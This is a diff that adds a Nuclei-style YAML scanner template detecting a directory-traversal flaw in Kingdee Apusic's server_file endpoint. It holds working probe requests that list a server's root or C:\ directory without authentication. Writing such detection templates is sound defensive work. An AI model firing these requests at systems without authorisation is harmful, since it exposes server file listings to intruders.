@@ -1,0 +1,39 @@
+id: kingdee-apusic-directory-traversal
+
+info:
+  name: Kingdee Apusic - Local File Inclusion
+  author: xc
+  severity: medium
+  description: Kingdee Apusic server_file is vulnerable to local file inclusion and can allow attackers to obtain sensitive server information.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  tags: kingdee,lfi,traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/protected/selector/server_file/files?folder=C://&suffix="
+      - "{{BaseURL}}/admin/protected/selector/server_file/files?folder=/&suffix="
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"name":"Windows","path":"C:\\\\Windows","folder":true}'
+          - '{"name":"root","path":"/root","folder":true}'
+        condition: or
+
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/08/03
